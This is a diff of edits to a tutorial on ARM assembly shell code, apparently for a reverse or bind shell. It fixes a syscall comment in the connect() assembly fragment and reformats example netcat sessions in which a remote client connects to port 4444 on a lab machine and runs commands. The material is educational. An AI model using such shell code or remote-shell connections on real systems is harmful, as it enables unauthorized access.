@@ -240,7 +240,7 @@ So here is an assembly version of the same **reverse-shell** C code
         @ save socket
         mov r4, r0
 
-        @ syscall @283 connect(sock, &sa, 16)
+        @ syscall #283 connect(sock, &sa, 16)
         mov r0, r4
         adr r1, _sa
         mov r2, #16
@@ -333,9 +333,9 @@ Build and run
 Connect from a remote client using netcat as a client. The target ARM machine is at 192.168.10.221.
 
     remote:$ nc 192.168.10.221 4444
-    remote:$ uname -a
-    remote:$ Linux wandq-2 4.19.12-jumpnow #1 SMP Sat Dec 22 09:14:15 UTC 2018 armv7l armv7l armv7l GNU/Linux
-    remote:$ exit
+    uname -a
+    Linux wandq-2 4.19.12-jumpnow #1 SMP Sat Dec 22 09:14:15 UTC 2018 armv7l armv7l armv7l GNU/Linux
+    exit
 
 Setting the IP address to **INADDR_ANY** means **0.0.0.0** or listen on every interface.
 
@@ -432,7 +432,7 @@ A quick test
 On the remote
 
     remote:$ nc 192.168.10.221 4444
-    remote:$ uname -a
+    uname -a
     Linux wandq-2 4.19.12-jumpnow #1 SMP Sat Dec 22 09:14:15 UTC 2018 armv7l armv7l armv7l GNU/Linux
     exit
 
